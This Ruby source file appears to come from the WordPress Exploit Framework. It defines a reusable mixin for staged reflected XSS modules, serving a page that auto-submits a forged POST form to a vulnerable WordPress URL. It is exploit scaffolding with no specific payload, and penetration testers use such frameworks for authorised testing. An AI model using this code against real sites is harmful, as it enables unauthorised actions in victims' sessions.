# Provides reusable functionality for reflected XSS modules.
module Wpxf::WordPress::StagedReflectedXss
  include Wpxf::WordPress::ReflectedXss

  # Initialize a new instance of {StagedReflectedXss}.
  def initialize
    super
    register_option(initial_req_path_opt)
  end

  # @return [String] the path to use for the initial request.
  def initial_req_path
    normalized_option_value('initial_req_path')
  end

  # Invoked when a HTTP request is made to the server.
  # @param path [String] the path requested.
  # @param params [Hash] the query string parameters.
  # @param headers [Hash] the HTTP headers.
  # @return [String] the response body to send to the client.
  def on_http_request(path, params, headers)
    if path.eql? normalize_uri(xss_path, initial_req_path)
      emit_info 'Initial request received...'
      return { type: 'text/html', body: initial_script }
    else
      super
    end
  end

  # @return [String] the URL to send the user to which contains the XSS vector.
  def url_with_xss
    normalize_uri(xss_url, initial_req_path)
  end

  # @return [String] the initial script that should be served to automate a form submission to the vulnerable page.
  def initial_script
    nil
  end

  # Create a basic POST script with the specified fields. All values in the script will be wrapped in double quotes.
  # @param url [String] the vulnerable URL.
  # @param fields [Hash] the fields and values to inject into the script.
  def create_basic_post_script(url, fields)
    json = ''
    fields.each_with_index do |(k, v), i|
      if i < fields.size - 1
        json += "\"#{k}\": \"#{v}\",\n"
        next
      end

      json += "\"#{k}\": \"#{v}\"\n"
    end

    %|
      <html><head></head><body><script>
        #{js_post}
        post('#{url}', {
          #{json}
        });
      </script></body></html>
    |
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    if initial_script.nil?
      raise 'Required method "initial_script" has not been implemented'
    end

    super
  end

  private

  def initial_req_path_opt
    StringOption.new(
      name: 'initial_req_path',
      desc: 'The path to be used to identify the initial request',
      required: true,
      default: Utility::Text.rand_alpha(rand(5..10))
    )
  end
end
